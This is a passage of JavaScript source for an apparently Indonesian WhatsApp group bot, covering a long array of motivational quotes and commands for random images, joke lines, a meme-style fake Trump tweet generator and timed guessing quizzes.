Memanfaatkan peluang adalah dengan mengatakan tidak pada peluang baru dan fokus mengembangkan apa yang sudah ada di tanganjangan takut karena masalah yang anda hadapi tidak lebih besar dari jalan keluarnya, Allah siapkan bagi andaAda saatnya penundaan memberikan keuntungan terutama saat terlalu emosi untuk mengambil keputusan','atasan hanya memberikan tugas berat pada karyawan terbaik, Allah hanya memberikan ujian pada pada manusia terbaikKadang cara terbaik untuk Memanfaatkan peluang adalah dengan mengatakan tidak pada peluang baru dan fokus mengembangkan apa yang sudah ada di tanganjangan takut karena masalah yang anda hadapi tidak lebih besar dari jalan keluarnya, Allah siapkan bagi andaAda saatnya penundaan memberikan keuntungan terutama saat terlalu emosi untuk mengambil keputusan','berusaha dan gagal Ternyata jauh lebih melegakan daripada pasrah melihat ke kanan dengan tangan terlipat','lewat kesulitan lah manusia belajar, lewatnya kenyamanan lah manusia Terlena','Saat kita merasa hebat kita baru saja kehilangan separuh pangkat kita karena lengah untuk terus belajar','hidup seseorang telah ditebak, tapi Nasib orang malas mudah untuk ditebak','Orang pintar itu biasa orang hebat itu luar biasa tapi orang berani lah pemenangnyahidup seseorang telah ditebak, tapi Nasib orang malas mudah untuk ditebak','Orang hebat membicarakan ide, orang menengah membicarakan pengalaman, orang lemah membicarakan orang lainOrang pintar itu biasa orang hebat itu luar biasa tapi orang berani lah pemenangnyahidup seseorang telah ditebak, tapi Nasib orang malas mudah untuk ditebak','Anda tidak akan mengubah kehidupan sampai anda mengubah Apa yang anda lakukan setiap hari','bertahan saja tidak cukup anda perlu bereaksi terhadap tekanan dan merubah keadaan','masa depan kita tergantung pada apa yang kita lakukan pada saat ini. Maka jangan sia-siakan waktumu sekarang','Nilai manusia ditentukan bukan dari apa yang diperoleh melainkan apa yang telah diberikan','Malas adalah kemenangan saat ini dan kekalahan di masa nanti','sebuah masalah merupakan kesempatan bagi anda untuk mengeluarkan kemampuan terbaik anda','Kematian tidak dapat mengubur perbuatan baik seseorang','Asal percaya dengan sungguh-sungguh apapun keyakinan Anda dapat menjadi kenyataan','Jika ada hari buruk maka pasti akan hari ada hari baik tugas kita adalah terus bergerak majuAsal percaya dengan sungguh-sungguh apapun keyakinan Anda dapat menjadi kenyataan','Mengeluh adalah cara paling buruk dalam menyelesaikan masalah','Tetap Bertahan dan setia pada tujuan saat menghadapi Hambatan adalah kunci kesuksesan','Tidak perlu keahlian khusus untuk mencari musuh, tapi perlu kesetiaan untuk mempertahankan teman','Orang tua bukan hanya punya kekuatan untuk menatap juga untuk mengalah','Keuletan adalah tanda jadi kesuksesan','cepat atau lambat mereka yang menang adalah mereka yang berfikir dan yakin bahwa mereka bisa','Jaga terus Api Harapan Anda seperti menjaga hidup anda sendiri','Saat semua jalan tertutup. Buatlah jalan dan berserahlah kepada Allah','lari dari masalah bukanlah penyelesaian masalah, hadapi dan Belajarlah dari masalah itu','Rezeki itu ditangan Allah yang kita lakukan hanya berusaha semaksimal mungkin dan menyerahkan hasilnya kepada yang kuasa','Sukses dimulai dengan melakukan apa yang harus dilakukan','rasa syukur membuat kita tidak pernah merasa kekurangan','goal hanya sekedar goal kalau kita tidak mempunyai alasan yang kuat Mengapa kita harus mencapainya','Apapun yang terjadi Yakinlah bahwa Allah menginginkan kita akan jadi lebih baik karena Kejadian ini','orang yang paling Bahagia bukanlah orang yang punya hal-hal terbaik tapi orang yang bisa menjadikan hal-hal yang ia punya menjadi yang terbaikApapun yang terjadi Yakinlah bahwa Allah menginginkan kita akan jadi lebih baik karena Kejadian ini','Respon kita terhadap masalah menentukan kualitas berita fokus pada solusi','Semua yang terlalu sedikit dan terlalu banyak tidak akan membawa kebaikan','Tidak semua usaha kita dibayar oleh manusia, tapi Allah akan membayarnya kelak','Tidak ada harga untuk waktu, tetapi waktu sangat berharga','Sukses seringkali datang pada mereka yang berani bertindak dan jarang menghampiri pada mereka yang dikalahkan ketakutan','Katakan bisa pasti bisa dengan penuh keyakinan otak kita akan segera mencari solusi','Orang yang tidak belajar dari kegagalan adalah orang yang gagal sesungguhnya','Segala sesuatu masalah yang menimpa Anda tidak akan pernah melatih kekuatan anda untuk menyelesaikannya','Saat orang lain melakukan impianmu itu berarti mereka belum mampu melihat sejauh anda melihat','Allah tidak pernah terlambat ia akan menunjukkan kuasanya, pada detik terakhir sekalipun','Bukan banyaknya panah yang menentukan kemenangan tapi tajam panah dan tujuannya yang menentukan','Mengeluh itu sisi lain dari pemborosan, pemborosan waktu dan energy','Pikiran negatif sangat berkuasa bila diberi kesempatan, jadi jangan memberinya kesempatan','Cinta akan membuat kita menjadi orang terkaya di dunia, oleh karena itu mulailah mencintai','Cemas yang berlebihan tidak akan mengubah apapun kecuali merusak diri sendiri','Hidup ini sederhana terkadang pikiran manusia yang membuatnya rumit','Siapa yang bisa menerima kelemahannya sesungguhnya baru saja menambah satu kelebihan pada dirinya','Ada saatnya dimana kekalahan rasa manis yaitu Saat anda sudah melakukan yang terbaik','Menabung itu hanya untuk mempertahankan kekayaan, untuk meningkatkannya berinvestasilah','Jika selamanya anda bermain aman, selamanya juga Anda di tempat yang sama','Lari dari masalah akan membuat masalah menjadi lebih besar, menghadapinya akan membuat anda menjadi lebih besar','Yang menyedihkan bukanlah bidikan yang meleset tapi bidikan tanpa target','Hati yang sedang panas menumpulkan logika dinginkan terlebih dahulu sebelum mengambil keputusan','bila ingin hasil yang besar jangan kerjakan hal yang mudah saja','Jangan biarkan impianmu dijajah oleh pendapat orang lain','Mulailah dengan yang kecil, Kerjakanlah dengan cara yang besar adalah dengan cara yang benar','Pengaruh perkataan orang kepada anda 100% adalah atas izin anda sendiri','Bekerjalah dengan ikhlas karena bekerja tanpa paksaan akan memberi hasil maksimal','Suka belajar, suka jualan, hidup hemat, beli aset suka, sedekah adalah 5 resep Makmur','Lebih baik menjadi raja tikus daripada ekor naga','Kerja keras dan kerja cerdas dapat memastikan keberhasilan dan sedekah dapat memudahkannya','Sakit dalam perjuangan itu hanya berlangsung sementara, namun jika anda menyerah rasa sakit itu akan terasa selamanya','Kegagalan terbesar adalah ketika tidak berani mencoba','Langkah pertama yang diperlukan untuk mendapatkan hal yang anda inginkan adalah memutuskan apa yang anda inginkan','Jangan takut menghadapi masa depan, hadapi dan perjuangkanlah','Dahulukan Allah dalam setiap langkah hidupmu maka semuanya akan ditambahkan kepadamu','Kesulitan adalah hujan terbaik untuk menunjukkan kualitas diri yang sebenarnya','Kesalahan dan kegagalan adalah guru terbaik jika kita mau jujur mengakui dan belajar darinya','Diam belum tentu menyelesaikan masalah tapi setidaknya tidak membesarkan masalah','Pemenang sejati selalu memberikan 100% upayanya, bahkan ketika tidak seorang pun melihatnya','Memaafkan orang lain bagai Menyiram air Bara dendam di hati baik untuk kesehatan kita','Jenius adalah 1 inspirasi dan 99 keringat tidak ada yang dapat menggantikan kerja keras','Disiplin memang tidak mudah tapi tanpa kedisiplinan hidup anda akan jauh lebih sulit','Orang yang berhenti belajar akan menjadi pemilik masa lalu, orang yang terus belajar akan menjadi pemilik masa depan','Hujan tidak hanya datang sendirian Ia datang bersama kesejukan, hal buruk tidak datang sendirian ia datang bersama pembelajaran','Menang atau kalah lakukanlah dengan jujur','Lihatlah tantangan sebagai ujian dan lihatlah masalah Sebagai teguran','Lihat ke atas agar terinspirasi lihat ke bawah agar bersyukur','Untuk meraih apa yang benar-benar anda inginkan fokus saja tidak cukup. Anda harus memiliki rasa lapar untuk meraihnya','90% dari kegagalan berasal dari orang-orang yang memiliki kebiasaan membuat alasan-alasan','Allah tidak membenci orang malas, tapi Allah mengizinkan orang rajin mengambil rezeki orang malas','Keajaiban itu nyata bagi mereka yang yakin berserah diri dan bekerja keras','Orang optimis dapat melihat peluang dalam masalah, orang pesimis akan melihat masalah dalam peluangKeajaiban itu nyata bagi mereka yang yakin berserah diri dan bekerja keras','Kualitas pikiran anda menentukan kualitas kehidupan anda','Bersyukur adalah cara ampuh untuk meraih energi yang dahsyat, Sudahkah anda bersyukur hari ini','Jangan mengharapkan sesuatu yang luar biasa jika anda hanya mau melakukan hal yang biasa saja','Kebahagiaan dimulai dengan ketulusan','1000 perkataan dan pengetahuan tidak berarti tanpa adanya satu tindakan yang nyata','Tangkap peluang, kerjakan, selesaikan','Ketika situasi di sekolah Anda tidak menyenangkan. Di saat itulah sebenarnya karakter anda sedang dibentuk','Seorang pemberani bukan orang yang tidak mempunyai rasa takut. Tapi orang yang mampu berjalan diatas rasa takutnya','dalam takut yang tampak adalah hambatan, dalam yakin yang tampak adalah kesempatan','Tidak ada kata gagal yang ada hanya sukses atau perlu belajar lagi sampai berhasil','Menjadi tua itu pasti menjadi dewasa itu pilihan','Kehidupan yang besar dimulai dari mimpi yang besar','Tragedi dalam kehidupan ini bukanlah yang berakhir terlalu cepat, tetapi kita menunggu terlalu lama untuk memulainya','Takut akan kegagalan seharusnya tidak menjadi alasan untuk tidak mencoba sesuatu','Hari ini adalah hari pertama dalam hidup anda. Buatlah hari ini menjadi hari yang terbaik sepanjang hidup anda dan semoga hari esok matahari bersinar dengan terang','Saya berpikir bahwa ada suatu hal yang lebih penting daripada sekedar percaya, tindakan Dunia ini penuh dengan pemimpi ,tidaklah banyak orang yang berani maju ke depan dan Mulai mengambil langkah pasti untuk mewujudkan visi mereka','Anda tidak dapat mengubah masa lalu anda dan janganlah terlalu khawatir dengan hari esok .Hari ini adalah hari yang dapat mengubah masa depan Anda','Allah, aku tahu bahwa saat aku kehilangan sesuatu engkau sedang mempersiapkan hal yang lebih baik untukkuAnda tidak dapat mengubah masa lalu anda dan janganlah terlalu khawatir dengan hari esok .Hari ini adalah hari yang dapat mengubah masa depan Anda','Pergilah sejauh mungkin dan ketika anda tiba di sana anda akan melihat lebih jauh lagiAllah, aku tahu bahwa saat aku kehilangan sesuatu engkau sedang mempersiapkan hal yang lebih baik untukkuAnda tidak dapat mengubah masa lalu anda dan janganlah terlalu khawatir dengan hari esok .Hari ini adalah hari yang dapat mengubah masa depan Anda','Menangis dapat melepaskan tambahan hormon stress, itulah mengapa kita sehabis menangis merasa lebih baikPergilah sejauh mungkin dan ketika anda tiba di sana anda akan melihat lebih jauh lagiAllah, aku tahu bahwa saat aku kehilangan sesuatu engkau sedang mempersiapkan hal yang lebih baik untukkuAnda tidak dapat mengubah masa lalu anda dan janganlah terlalu khawatir dengan hari esok .Hari ini adalah hari yang dapat mengubah masa depan Anda','Ketika cinta itu dipertahankan kamu akan tau siapa yang lebih menghargai tentang sebuah hubungan','Dalam hidup ini banyak orang tahu apa yang harus dilakukan, tetapi hanya sedikit yang melakukan apa yang ia ketahui. Mengetahui tidaklah cukup, Anda harus mengambil tindakan','Berilah perhatian lebih ke orang yang kamu sayangi, itu yang mereka butuhkan','Satu ons tindakan sama berharganya dengan satu ton teori','Kita mungkin terpisah sejak lama ketika tak mampu belajar untuk lebih dewasa','Sayangilah dia walau tidak sesempurna seperti yang kau inginkan','Kecantikan akan mengundang perhatian sikap santun memikat Kalbu','Mengetahui tidaklah cukup kita harus melakukannya, keinginan tak cukup hanya dengan berangan kita harus melakukannya','Kesalahan adalah bukti bahwa kamu sedang mencoba','Betapapun jauhnya air mengalir ia takkan pernah lupa hulunya','Lebih baik sendiri daripada bersama dengan orang yang salahBetapapun jauhnya air mengalir ia takkan pernah lupa hulunya','Lakukan sesuatu hari ini yang akan membuat dirimu berterima kasih di hari-hari mendatang','Waktu yang memutuskan Dengan siapa kamu akan berjumpa','Hati yang memutuskan siapa yang kamu inginkan dalam hidup ini','Dengan sikap yang akan menentukan siapa yang akan bertahan dalam hidupmu','Menjadi dewasa dan bijak diawali dengan menjadi muda dan bodoh','Lakukanlah apa yang paling kamu takutkan dalam hidupmu','Bekerjalah seolah kamu tak butuh uang, Cintailah seolah Kamu takkan Tersakiti dan menarilah seakan tak ada yang melihatmu','Jika hari ini sudah sempurna maka Apalah arti hari esok','Bintang pun tak kan bersinar tanpa kegelapan','Suatu saat aku akan menjadi tempat yang akan selalu kau rindu','Guru terbaik kamu adalah kesalahan terakhir yang kamu lakukan','Diam adalah respon terbaik untuk orang bodoh','Jangan pernah membuat keputusan yang permanen untuk perasaan yang sementara','Jika Allah yang menjadi alasan anda untuk hidup maka takkan pernah ada alasan untuk menyerah','Kegagalan ada bukan untuk ditakuti tetapi untuk dipelajari','Anda saat ini adalah hasil dari pengalaman anda','Keberuntungan adalah saat kesempatan datang, anda telah matang dengan segala persiapan','Jangan Menunggu hari yang terbaik untuk melangkah karena setiap hari sangatlah berharga','Keputusan yang baik diperoleh dari pengalaman, dan pengalaman didapat dari keputusan yang buruk','Setiap waktu yang anda lewati dengan sia-sia hanya menjauhkan anda dan semakin jauh dari kata sukses','Realitas kehidupan Anda adalah deskripsi dari jiwa dan pikiran anda','Berani mengambil keputusan maka anda telah melangkah 10 kali lebih cepat untuk sukses','Allah masih mencintai anda jika masih banyak cobaan dan tantangan hidup yang datang menghampiri anda. Allah percaya bahwa anda mampu melaluinya, maka jagalah kepercayaan itu','Ketika orang mengatakan anda sudah berubah sebenarnya itu hanya karena anda berhenti melakukan apa yang mereka ingin anda lakukan','Jangan menukar apa yang sangat anda inginkan untuk apa yang Anda ingin untuk saat ini','Orang-orang yang mengikuti keramaian biasanya tersesat di dalamnya','Orang tua saya bekerja terlalu keras untuk saya bukan supaya saya tidak hanya menjadi orang biasa tetapi menjadi orang luar biasa','Anda menghalangi impian anda ketika anda mengizinkan ketakutan Anda tumbuh lebih besar dari keyakinan anda','Sang juara percaya kepada dirinya sendiri bahkan ketika orang lain tidak percaya','Hanya mereka yang berani mengambil resiko yang jauh pasti dapat menemukan Seberapa jauh seseorang dapat pergi','Tunjukkan teman Anda, saya akan menunjukkan masa depan Anda','Beberapa orang ingin sesuatu terjadi, beberapa orang berharap itu akan terjadi, yang lain mewujudkannya jadi kenyataan','Jika anda menghabiskan waktu untuk mencoba menjadi baik dalam segala hal, Anda tidak akan pernah menjadi hebat dalam apapun','Sebuah perjalanan ribuan mil dimulai dari langkah kecil','Apa yang akan Anda kerjakan, Ketika anda tahu anda tidak mungkin gagal','Ketika kita memiliki satu sama lain, kita Memiliki segalanya','Kebesaran sebenarnya dapat ditemukan dalam hal hal kecil yang terkadang kita lewatkan','Bekerja keraslah, Bermimpilah lebih besar dan jadilah yang terbaik','Apa yang kita pikirkan menentukan apa yang akan terjadi pada kita. Jadi jika kita ingin mengubah hidup kita, kita perlu sedikit mengubah pikiran kita.','Seseorang yang berani membuang satu jam waktunya tidak mengetahui nilai dari kehidupan.','Saya memiliki filosofi yang sederhana: isi apa yang kosong, kosongkan apa yang terlalu penuh.','Hidup adalah cermin dan akan merefleksikan kembali kepada para pemikir mengenai apa yang mereka pikirkan.','Anda di sini hanya untuk persinggahan yang singkat. Jangan terburu, jangan khawatir. Yakinlah bahwa Anda menghirup wangi bunga sepanjang perjalanan.Hidup adalah cermin dan akan merefleksikan kembali kepada para pemikir mengenai apa yang mereka pikirkan.','Hidup adalah serangkaian perubahan yang alami dan spontan. Jangan tolak mereka karena itu hanya membuat penyesalan dan duka. Biarkan realita menjadi realita. Biarkan sesuatu mengalir dengan alami ke manapun mereka suka.','Hidup yang baik adalah hidup yang diinspirasi oleh cinta dan dipandu oleh ilmu pengetahuan.','Kenyataannya, Anda tidak tahu apa yang akan terjadi besok. Hidup adalah pengendaraan yang gila dan tidak ada yang menjaminnya.','Hidup adalah mimpi bagi mereka yang bijaksana, permainan bagi mereka yang bodoh, komedi bagi mereka yang kaya, dan tragedi bagi mereka yang miskin','Hidup itu bukan soal menemukan diri Anda sendiri, hidup itu membuat diri Anda sendiri.','Hal yang paling penting adalah menikmati hidupmu, menjadi bahagia, apapun yang terjadi.','Hidup itu sederhana, kita yang membuatnya sulit.']
					const vasi = motiv[Math.floor(Math.random() * motiv.length)]
					vass = await getBuffer(`https://i.ibb.co/346nsHC/56806462-399407660892553-4745814299438481408-o.jpg`)
					client.sendMessage(from, vass, image, { quoted: mek, caption: '*Motivasi*\n\n'+ cin })
					await limitAdd(sender)
					break
				case 'fakedonald':
                    if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} IXB BOT`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/tweettrump?apikey=${LolApi}&text=${ini_txt}`)
                    await client.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break
			    case 'art':
                case 'bts':
                case 'exo':
                case 'cogan':
                case 'blackpink':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)	
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/random/${command}?apikey=${LolApi}`)
                    client.sendMessage(from, ini_buffer, image, { quoted: mek })
                    await limitAdd(sender)
                    break
				case 'cecan':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)				
				    motive =["https://i.pinimg.com/originals/69/d7/b3/69d7b3d5a089e7cbee0250ea5da9b14b.jpg","https://i.pinimg.com/originals/78/fa/10/78fa10ab94c0dc9e19a18358a9752070.jpg","https://i.pinimg.com/originals/93/e0/a3/93e0a3816183696ff89b1ad7db2fd3c0.jpg","https://i.pinimg.com/originals/a6/34/cf/a634cfa655269069439e9476780b46fe.jpg","https://i.pinimg.com/originals/dc/f5/69/dcf569a7b08efcae64d0747b51d04a7d.jpg","https://i.pinimg.com/originals/4f/96/2b/4f962b89bd7ceb438b3e9ebbd075184c.jpg","https://i.pinimg.com/originals/c2/fb/e7/c2fbe7a6955a85c51b9ee8062a7b68d3.jpg","https://i.pinimg.com/originals/44/54/24/44542415cf206f2c041e3bbb52a69419.jpg","https://i.pinimg.com/originals/ae/3c/40/ae3c40e0a2f653811b5a67ccd6b9d8cc.jpg","https://i.pinimg.com/originals/bd/fa/33/bdfa3317d96e6cdafaf27e3b337d05b4.jpg","https://i.pinimg.com/originals/75/6a/f2/756af236ae909431567ed184c43aae6f.png","https://i.pinimg.com/originals/a5/95/d7/a595d7fe6b8dc00d1aaa7287f1dd304e.jpg","https://i.pinimg.com/originals/40/37/78/40377871ee06a4a434c39e90b1f647e1.jpg","https://i.pinimg.com/originals/45/73/ac/4573ac9484c480500872b7c91f758040.jpg","https://i.pinimg.com/originals/32/7d/0b/327d0be89cc60321128d0f0bdaadfc15.jpg","https://i.pinimg.com/originals/f4/a1/0f/f4a10ffd44aea604383be84a34f69f90.jpg","https://i.pinimg.com/originals/ec/7f/b5/ec7fb5506136f72876633aab957a755a.jpg","https://i.pinimg.com/originals/4c/e9/15/4ce915c8245586f541c4d0a8b71cc500.jpg","https://i.pinimg.com/originals/03/2a/14/032a145e96154753e33bdda30d9f41f1.jpg","https://i.pinimg.com/originals/f4/5b/07/f45b070de82acec89092eaea1b415029.jpg","https://i.pinimg.com/originals/a9/f2/da/a9f2da1277fb7bc801856c3b9c12d37d.jpg","https://i.pinimg.com/originals/af/ab/93/afab93ebbf109a601dcb77b5baa494b4.jpg","https://i.pinimg.com/originals/b9/38/df/b938dfba6c139ad45ce51203a43eac0d.jpg","https://i.pinimg.com/originals/af/10/0a/af100a49cb8f53f0dd5b48664ede9db8.jpg","https://i.pinimg.com/originals/99/18/6c/99186c2145e1223f885103f51817be78.jpg","https://i.pinimg.com/originals/3c/fd/c9/3cfdc9ba7cf79ed061808e162162f4da.jpg","https://i.pinimg.com/originals/31/95/64/319564a33b5ed46a52d30c18d2310f22.jpg","https://i.pinimg.com/originals/1c/2d/9f/1c2d9ffdd104200355bab43c9d3fad20.gif","https://i.pinimg.com/originals/4a/aa/12/4aaa12940f51fdfb1684964df3796c4c.jpg","https://i.pinimg.com/originals/37/90/bc/3790bc29be16d95174af4eff4ee3859f.jpg","https://i.pinimg.com/originals/4c/12/8f/4c128fda6e71a9f4c670a78a21d8c196.jpg","https://i.pinimg.com/originals/34/92/10/3492100b4a924458a2bf5340d68293c2.jpg","https://i.pinimg.com/originals/5a/dd/12/5add12091eafba364ec76c91d20e75ac.jpg","https://i.pinimg.com/originals/da/c3/59/dac359d1fc87193c2b9d85bb96fedcbc.jpg","https://i.pinimg.com/originals/2e/d6/a9/2ed6a9670d942220eab92b99bb0d1c09.jpg","https://i.pinimg.com/originals/f1/89/e3/f189e3d9b353f91b60060cc64e6706c9.jpg","https://i.pinimg.com/originals/8c/06/c2/8c06c22283cf98abdb8922e2f3aa0a6a.jpg","https://i.pinimg.com/originals/8b/6f/0b/8b6f0b1e213240eaad90894292a2d3c1.jpg","https://i.pinimg.com/originals/89/bf/b8/89bfb86392d39477adcd66444cf19845.jpg","https://i.pinimg.com/originals/35/e2/cc/35e2cc3c535d8f1cfeaf13cce69ac984.jpg","https://i.pinimg.com/originals/c0/01/a1/c001a16e2629872a3d7ea7fdbe5a4e98.jpg","https://i.pinimg.com/originals/b4/eb/48/b4eb486def2d413716c5fa033af9fb34.jpg","https://i.pinimg.com/originals/55/ee/7b/55ee7b5f4889cc34ec1a01d2e7875b53.jpg","https://i.pinimg.com/originals/0c/b3/0e/0cb30ea660aafbae32cc07433bf3eea2.jpg","https://i.pinimg.com/originals/1f/50/23/1f5023991f2a01cff748e84c4cf3612d.jpg","https://i.pinimg.com/originals/ab/53/07/ab5307df9234934f385eb6235aa6c2cd.jpg","https://i.pinimg.com/originals/e1/a1/7c/e1a17c5f359846741c687ef1fcadb316.jpg","https://i.pinimg.com/originals/16/1b/21/161b215ee2f8e0a040c91f18c054d705.jpg","https://i.pinimg.com/originals/da/07/1a/da071a5fafbc6487d38edd4e9f3401db.jpg","https://i.pinimg.com/originals/54/f4/26/54f42615f9ad45743e6fb08ed86623f0.jpg"]
				    vasih = motive[Math.floor(Math.random() * motive.length)]
				    vass = await getBuffer(vasih)
				    client.sendMessage(from, vass, image, { quoted: mek})
				    await limitAdd(sender)
				   break
              case 'gombal':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)	
			     hasil = gombal[Math.floor(Math.random() * (gombal.length))]
				 client.sendMessage(from, '*'+hasil+'*\n\n*~GOMBAL~*', text, {quoted: mek})
				 await limitAdd(sender)
				 break
		case 'quotesmuslim':
			if (!isRegistered) return reply(mess.only.userB)
			if (isBanned) return reply(mess.only.benned)
			if (isLimit(sender)) return reply(mess.limituser)
			     hasil = muslim[Math.floor(Math.random() * (muslim.length))]
				 client.sendMessage(from, '*'+hasil+'*\n\n*~IXB-BOT~*', text, {quoted: mek})
				 await limitAdd(sender)
				 break
	   case 'hekerbucin':
		if (!isRegistered) return reply(mess.only.userB)
		if (isBanned) return reply(mess.only.benned)
		if (isLimit(sender)) return reply(mess.limituser)
				hasil = hekerbucin[Math.floor(Math.random() * (hekerbucin.length))]
				client.sendMessage(from, '*'+hasil+'*', text, {quoted: mek})
				await limitAdd(sender)
				break 
            case 'jadian':
				if (!isGroup) return reply(mess.only.group)
				if (isBanned) return reply(mess.only.benned)
					hmmd = []
					const nikjdn = groupMembers
					const manikhm = groupMembers
					const sayanik = nikjdn[Math.floor(Math.random() * nikjdn.length)]
					const dianik = manikhm[Math.floor(Math.random() * manikhm.length)]
					teks = `Ciee yang lagi jadian @${sayanik.jid.split('@')[0]} ️💜 @${dianik.jid.split('@')[0]} Jangan lupa bot dikasih yak 🐤🐤 `
					hmmd.push(sayanik.jid)
					hmmd.push(dianik.jid)
					mentions(teks, hmmd, true)
					await limitAdd(sender)
					break	    
			 case 'tebakgambar': // case by piyo-chan
			        if (!isGroup) return reply(mess.only.group)
                    if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/tebak/gambar?apikey=${LolApi}`)
                    get_result = get_result.result
                    ini_image = get_result.image
                    jawaban = get_result.answer
                    ini_buffer = await getBuffer(ini_image)
                    await client.sendMessage(from, ini_buffer, image, { quoted: mek, caption: `Jika Tidak Bisa Menjawab Soal Ini\nSilahkan ${prefix}nextkuiz untuk menggantikan soal atau soal berikutnya\nDan ${prefix}stopkuiz untuk memberhentikan kuiz\n*MENJAWAB PAKAI HURUP KECIL SEMUA YA KAK:)*` }).then(() => {
                        tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()
                        fs.writeFileSync("./database/json/tebakgambar.json", JSON.stringify(tebakgambar))
                    })
                    await sleep(120000)
                    if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete tebakgambar[sender.split('@')[0]]
                        fs.writeFileSync("./database/json/tebakgambar.json", JSON.stringify(tebakgambar))
                    }
					
                    break
         	case 'nextkuiz': // case by piyo-chan
			        if (!isGroup) return reply(mess.only.group)
					delete tebakgambar[sender.split('@')[0]]
                    fs.writeFileSync("./database/json/tebakgambar.json", JSON.stringify(tebakgambar))
					get_result = await fetchJson(`http://api.lolhuman.xyz/api/tebak/gambar?apikey=${LolApi}`)
                    get_result = get_result.result
                    ini_image = get_result.image
                    jawaban = get_result.answer
                    ini_buffer = await getBuffer(ini_image)
                    await client.sendMessage(from, ini_buffer, image, { quoted: mek}).then(() => {
                        tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()
                        fs.writeFileSync("./database/json/tebakgambar.json", JSON.stringify(tebakgambar))
                    }) 
                    await sleep(120000)
					if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete tebakgambar[sender.split('@')[0]]
                        fs.writeFileSync("./database/json/tebakgambar.json", JSON.stringify(tebakgambar))
                    }
					
                    break
                case 'stopkuiz':
                    if (!tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Anda tidak memiliki tebak gambar sebelumnya")
                    delete tebakgambar[sender.split('@')[0]]
                    fs.writeFileSync("./database/json/tebakgambar.json", JSON.stringify(tebakgambar))
					ini_buffe = await getBuffer(`https://i.ibb.co/NShSfQc/wallpapersden-com-tears-crying-girl-wxl.jpg`)
					await client.sendMessage(from, ini_buffe, image, { quoted: mek, caption: 'Yah kok udahan si kak:('})
                    break

					case 'tebakkata':
						if (!isGroup) return reply(mess.only.group)
						if (tebakkata.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
						if (!isRegistered) return reply(mess.only.userB)
						if (isBanned) return reply(mess.only.benned)
						if (isLimit(sender)) return reply(mess.limituser)	
							anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/kata?apikey=${LolApi}`, {method: 'get'})
							kata2 = `Silahkan tebak kata dibawah ini dengan benar!\n*${anu.result.pertanyaan}*\n\nTime out 120 detik`
							jawaban2 = anu.result.jawaban
							client.sendMessage(from, kata2, text,  {quoted: mek }).then(() => {
								tebakkata[sender.split('@')[0]] = jawaban2.toLowerCase()
								fs.writeFileSync("./database/json/tebakkata.json", JSON.stringify(tebakkata))
							})
							await sleep(120000)
							if (tebakkata.hasOwnProperty(sender.split('@')[0])) {
								reply("Jawaban: " + jawaban2)
								delete tebakkata[sender.split('@')[0]]
								fs.writeFileSync("./database/json/tebakkata.json", JSON.stringify(tebakkata))
							}
							await limitAdd(sender) 
							
							break 
							case 'susunkata':
								if (susunkata.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
								if (!isRegistered) return reply(mess.only.userB)
								if (isBanned) return reply(mess.only.benned)
								if (!isGroup) return reply(mess.only.group)
								if (isLimit(sender)) return reply(mess.limituser)
							anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/susunkata?apikey=${LolApi}`, {method: 'get'})
							kata3 = `Silahkan susun kata dibawah ini dengan benar!\n*${anu.result.pertanyaan}*\n\nTime out 120 detik`
							jawaban3 = anu.result.jawaban
							client.sendMessage(from, kata3, text,  {quoted: mek }).then(() => {
								susunkata[sender.split('@')[0]] = jawaban3.toLowerCase()
								fs.writeFileSync("./database/json/susunkata.json", JSON.stringify(susunkata))
							})
							await sleep(120000)
							if (susunkata.hasOwnProperty(sender.split('@')[0])) {
								reply("Jawaban: " + jawaban3)
								delete susunkata[sender.split('@')[0]]
								fs.writeFileSync("./database/json/susunkata.json", JSON.stringify(susunkata))
							}
							await limitAdd(sender) 
							break 
							case 'asahotak':
								if (asahotak.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
								if (!isRegistered) return reply(mess.only.userB)
		                        if (isBanned) return reply(mess.only.benned)
		                        if (!isGroup) return reply(mess.only.group)
		                        if (isLimit(sender)) return reply(mess.limituser)
									anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/asahotak?apikey=${LolApi}`, {method: 'get'})
									kata4 = `*${anu.result.pertanyaan}*\n\nTime out 120 detik`
									jawaban4 = anu.result.jawaban
									client.sendMessage(from, kata4, text,  {quoted: mek }).then(() => {
									asahotak[sender.split('@')[0]] = jawaban4.toLowerCase()
										fs.writeFileSync("./database/json/asahotak.json", JSON.stringify(asahotak))
									})
									await sleep(120000)
									if (asahotak.hasOwnProperty(sender.split('@')[0])) {
										reply("Jawaban: " + jawaban4)
										delete asahotak[sender.split('@')[0]]
										fs.writeFileSync("./database/json/asahotak.json", JSON.stringify(asahotak))
									}
									await limitAdd(sender) 
									break 
									case 'tebakbendera':
										if (tebakbendera.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
										if (!isRegistered) return reply(mess.only.userB)
										if (isBanned) return reply(mess.only.benned)
										if (!isGroup) return reply(mess.only.group)
										if (isLimit(sender)) return reply(mess.limituser)
											anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/bendera?apikey=${LolApi}`, {method: 'get'})
